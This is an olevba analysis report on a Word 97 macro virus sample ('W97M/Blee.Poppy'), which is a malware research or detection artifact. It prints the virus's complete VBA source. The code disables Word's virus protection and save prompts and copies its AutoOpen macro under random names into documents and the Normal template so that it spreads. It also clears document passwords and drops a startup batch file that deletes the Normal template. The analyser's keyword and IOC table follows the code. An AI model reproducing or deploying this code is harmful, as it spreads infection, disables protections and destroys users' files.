olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.c-e0936dee1ce165086663d483d328c20c3a746848
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.c-e0936dee1ce165086663d483d328c20c3a746848 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.c-e0936dee1ce165086663d483d328c20c3a746848 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()

'W97M/Blee.Poppy
'By VicodinES
'Macro Virus for Word 97
'"Mad Sloppy Code For A Sloppy Big Red Mess"

Randomize

fm = Int(Rnd * 3) + 2

Mrn1 = Int(Rnd * 8) + 1
Mrn2 = Int(Rnd * 8) + 1
Mrn3 = Int(Rnd * 8) + 1
Brn = Int(Rnd * 100) + 1

If Mrn2 = Mrn3 Then Mrn2 = Mrn2 + 1
If Mrn2 = Mrn1 Then Mrn2 = Mrn2 + 1
If Mrn2 > 8 Then Mrn2 = 0

If Mrn1 = Mrn3 Then Mrn1 = Mrn1 + 1
If Mrn1 = Mrn2 Then Mrn1 = Mrn1 + 1
If Mrn1 > 8 Then Mrn1 = 0

If Mrn3 = Mrn1 Then Mrn3 = Mrn3 + 1
If Mrn3 = Mrn2 Then Mrn3 = Mrn3 + 1
If Mrn3 > 8 Then Mrn3 = 0

If Mrn2 = Mrn3 Then Mrn2 = 0
If Mrn3 = Mrn2 Then Mrn2 = Mrn2 + 1
If Mrn1 = Mrn2 Then Mrn2 = Mrn2 + 1


If Mrn1 = 0 Then rename$ = "ToolsOptions"
If Mrn1 = 1 Then rename$ = "AutoClose"
If Mrn1 = 2 Then rename$ = "FileTemplates"
If Mrn1 = 3 Then rename$ = "ToolsMacro"
If Mrn1 = 4 Then rename$ = "AutoOpen"
If Mrn1 = 5 Then rename$ = "HelpAbout"
If Mrn1 = 6 Then rename$ = "AutoExec"
If Mrn1 = 7 Then rename$ = "ViewVBCode"
If Mrn1 = 8 Then rename$ = "AutoExit"

If Mrn2 = 0 Then rename2$ = "ToolsOptions"
If Mrn2 = 1 Then rename2$ = "AutoClose"
If Mrn2 = 2 Then rename2$ = "FileTemplates"
If Mrn2 = 3 Then rename2$ = "ToolsMacro"
If Mrn2 = 4 Then rename2$ = "AutoOpen"
If Mrn2 = 5 Then rename2$ = "HelpAbout"
If Mrn2 = 6 Then rename2$ = "AutoExec"
If Mrn2 = 7 Then rename2$ = "ViewVBCode"
If Mrn2 = 8 Then rename2$ = "AutoExit"


If Mrn3 = 0 Then rename3$ = "ToolsOptions"
If Mrn3 = 1 Then rename3$ = "AutoClose"
If Mrn3 = 2 Then rename3$ = "FileTemplates"
If Mrn3 = 3 Then rename3$ = "ToolsMacro"
If Mrn3 = 4 Then rename3$ = "AutoOpen"
If Mrn3 = 5 Then rename3$ = "HelpAbout"
If Mrn3 = 6 Then rename3$ = "AutoExec"
If Mrn3 = 7 Then rename3$ = "ViewVBCode"
If Mrn3 = 8 Then rename3$ = "AutoExit"

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
    

    ok$ = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    nfat = GetAttr(NormalTemplate.FullName)
    
    If nfat = vbReadOnly Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
    If nfat = vbReadOnly + vbArchive Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff

    If Soma$ = UCase(NormalTemplate) Then
        
        fat = GetAttr(ActiveDocument.FullName)
        ao$ = WordBasic.[MacroName$](fm, 0)
        
        If fat >= vbArchive Then ok$ = 1
        If fat >= vbSystem Then ok$ = 1
        If fat >= vbHidden Then ok$ = 1
        If ok$ = 1 Then
        

            If rename$ = "AutoOpen" Then backup$ = "VicodinES"
            If rename2$ = "AutoOpen" Then backup$ = "VicodinES"
            If ao$ = "AutoOpen" Then backup$ = "VicodinES"
            If backup$ <> "VicodinES" Then backup$ = "AutoOpen"
            
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = backup$
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
            
            Application.OrganizerRename Source:= _
        ActiveDocument.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems

            Next X
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            
        End If
    Else
               
        ao$ = "AutoOpen"
       
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = rename3$
            
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
        Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
        
        Next X
        

        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
    End If
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0

End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 Part333$ = "c:\windows\startm~1\programs\startup\msfile.bat"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + Part333$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

